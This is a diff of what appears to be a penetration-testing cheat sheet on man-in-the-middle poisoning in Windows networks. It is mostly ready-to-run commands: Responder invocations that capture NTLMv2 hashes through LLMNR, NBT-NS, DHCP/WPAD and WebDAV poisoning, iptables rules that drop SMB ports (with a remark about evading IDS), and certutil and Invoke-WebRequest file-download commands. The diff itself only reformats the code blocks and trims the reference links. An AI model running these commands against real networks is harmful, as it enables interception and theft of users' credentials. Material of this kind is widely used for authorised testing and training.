@@ -6,40 +6,50 @@ Search Tag(s): #mitm #responder #smb #relay #ntlm
 
 ### 2.1 - LLMNR
 
-- NBT-NS and LLMNR Poisoning via capturing NTLMv2-SSP hashes
+NBT-NS and LLMNR Poisoning via capturing NTLMv2-SSP hashes
 
-`$ sudo responder -I <interface> -rdwv`
+```
+$ sudo responder -I <interface> -rdwv
+```
 
-- LLMNR Poisoning
+LLMNR Poisoning
 
-`$ sudo responder -I eth0 --lm -v`
+```
+$ sudo responder -I <interface> --lm -v
+```
 
 ### 2.2 - DHCP
 
-- DHCP and WPAD poisoning
+DHCP and WPAD poisoning
 
 When a windows host requires a new IP address dynamically it can perform HTTP WPAD poisoning response while the user uses a web browser that contains auto proxy settings enabled
 
-`$ sudo responder -I <interface> -Pdwv`
+```
+$ sudo responder -I <interface> -Pdwv
+```
 
 ### 2.3 - WebDAV
 
-- Block SMB traffic on the attacker's machine to poison NTLMv2-SSP responses via WebDAV/HTTP
+Block SMB traffic on the attacker's machine to poison NTLMv2-SSP responses via WebDAV/HTTP.
 
 Note: You don't have to block the ports unless you're evading some IDS to identify you for performing MITM poisoning
 
 ```
 $ sudo iptables -A INPUT -p udp --dport 137 -j DROP
-$ sudo iptables -A INPUT -p udp --dport 138 -j DROP
-$ sudo iptables -A INPUT -p tcp --dport 139 -j DROP
-$ sudo iptables -A INPUT -p tcp --dport 445 -j DROP
+sudo iptables -A INPUT -p udp --dport 138 -j DROP
+sudo iptables -A INPUT -p tcp --dport 139 -j DROP
+sudo iptables -A INPUT -p tcp --dport 445 -j DROP
+
+$ sudo responder -I <interface> -Pdv
 ```
 
-`$ sudo responder -I eth1 -Pdv`
+Windows target.
 
-`C:\> certutil -urlcache -split -f https://google.com file.txt`
+```
+C:\> certutil -urlcache -split -f https://google.com file.txt
 
-`PS C:\> Invoke-WebRequest -Uri https://google.com -OutFile file.txt`
+PS C:\> Invoke-WebRequest -Uri https://google.com -OutFile file.txt
+```
 
 ---
 ## References
@@ -60,14 +70,6 @@ $ sudo iptables -A INPUT -p tcp --dport 445 -j DROP
 
 - [n00py: The Dangers of Endpoint Discovery in Vipre Endpoint Security](https://www.n00py.io/2020/12/the-dangers-of-endpoint-discovery-in-vipre-endpoint-security/)
 
-### Mubix
+### Osanda
 
-- [Malicious.link: SMB/HTTP Auth Capture via SCF File](https://room362.com/posts/2016/smb-http-auth-capture-via-scf/)
-
-### DMCXBLUE
-
-- [DMCXBLUE: Capturing Hashes](https://dmcxblue.net/2020/06/17/capturing-hashes/)
-
-- [Using A SCF File to Gather Hashes](https://1337red.wordpress.com/using-a-scf-file-to-gather-hashes/)
-
-- [Places of Interest in Stealing NetNTLM Hashes](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/)
+- [Osanda: Places of Interest in Stealing NetNTLM Hashes](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/)
